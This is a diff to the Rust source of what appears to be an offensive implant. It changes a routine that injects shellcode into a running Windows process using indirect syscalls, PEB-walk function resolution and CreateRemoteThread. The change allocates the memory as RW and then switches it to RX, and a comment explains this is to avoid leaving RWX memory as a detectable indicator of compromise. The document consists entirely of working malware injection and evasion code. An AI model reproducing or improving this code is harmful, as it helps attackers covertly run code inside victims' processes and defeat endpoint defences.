@@ -1883,9 +1883,10 @@ unsafe fn inject_existing_fls(pid: u32, shellcode: &[u8]) -> Result<(), &'static
 
 /// Inject shellcode into an EXISTING process (pid != 0).
 ///
-/// Opens the target via `OpenProcess`, allocates RWX via indirect syscall
-/// `NtAllocateVirtualMemory`, writes via `NtWriteVirtualMemory`, creates a
-/// remote thread via `CreateRemoteThread` (kernel32, PEB-walk resolved).
+/// Opens the target via `OpenProcess`, allocates RW via indirect syscall
+/// `NtAllocateVirtualMemory`, writes via `NtWriteVirtualMemory`, protects
+/// RX, then creates a remote thread via `CreateRemoteThread` (kernel32,
+/// PEB-walk resolved). Fail-closed: never `CreateRemoteThread` on RWX.
 /// Works on all Windows versions (XP+).
 ///
 /// # Safety
@@ -1943,15 +1944,16 @@ unsafe fn inject_existing_resolve() -> Result<InjectFns, &'static str> {
     Ok(InjectFns { op, crt, ch })
 }
 
-/// Steps 1-2: allocate RWX in the target via indirect syscall + write the
-/// shellcode. On failure the process handle is closed here.
+/// Steps 1-3: allocate RW in the target, write the shellcode, then protect
+/// RX. Fail-closed: never return success with the region still RWX. On
+/// failure the process handle is closed here (no CreateRemoteThread on RWX).
 unsafe fn inject_existing_stage_alloc(
     fns: &InjectFns,
     rt: &'static nyx_implant_core::syscalls::Runtime,
     h_proc: *mut core::ffi::c_void,
     shellcode: &[u8],
 ) -> Result<usize, &'static str> {
-    // 1. Allocate RWX in target via indirect syscall.
+    // 1. Allocate RW (not RWX) in target via indirect syscall.
     let mut remote_base: usize = 0;
     let mut region_size: usize = shellcode.len();
     let alloc_status = unsafe {
@@ -1961,8 +1963,8 @@ unsafe fn inject_existing_stage_alloc(
             0, // ZeroBits
             &mut remote_base,
             &mut region_size,
-            0x3000,
-            0x40, // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+            0x3000, // MEM_COMMIT | MEM_RESERVE
+            crate::stealth::payload_alloc_protect(),
         )
     };
     if alloc_status.map_or(true, |s| s < 0) {
@@ -1986,10 +1988,30 @@ unsafe fn inject_existing_stage_alloc(
         unsafe { (fns.ch)(h_proc) };
         return Err("remote write failed");
     }
+
+    // 3. RW → RX before CreateRemoteThread. Mirror threadless_inject_alloc:
+    //    a silent protect failure would leave private RWX, a louder IOC.
+    let mut prot_base = remote_base;
+    let mut prot_size = region_size;
+    let mut old_prot: u32 = 0;
+    let prot_status = unsafe {
+        nyx_implant_core::syscalls::nt_protect_virtual_memory_process(
+            rt,
+            h_proc as usize,
+            &mut prot_base,
+            &mut prot_size,
+            crate::stealth::desired_final_protect(),
+            &mut old_prot,
+        )
+    };
+    if prot_status.map_or(true, |s| s < 0) {
+        unsafe { (fns.ch)(h_proc) };
+        return Err("NtProtectVirtualMemory RW→RX failed");
+    }
     Ok(remote_base)
 }
 
-/// Step 3: CreateRemoteThread with lpStartAddress = the shellcode base. On
+/// Step 4: CreateRemoteThread with lpStartAddress = the shellcode base. On
 /// failure the process handle is closed here.
 ///
 /// v0.3.0 passed None for lpStartAddress and the shellcode address as
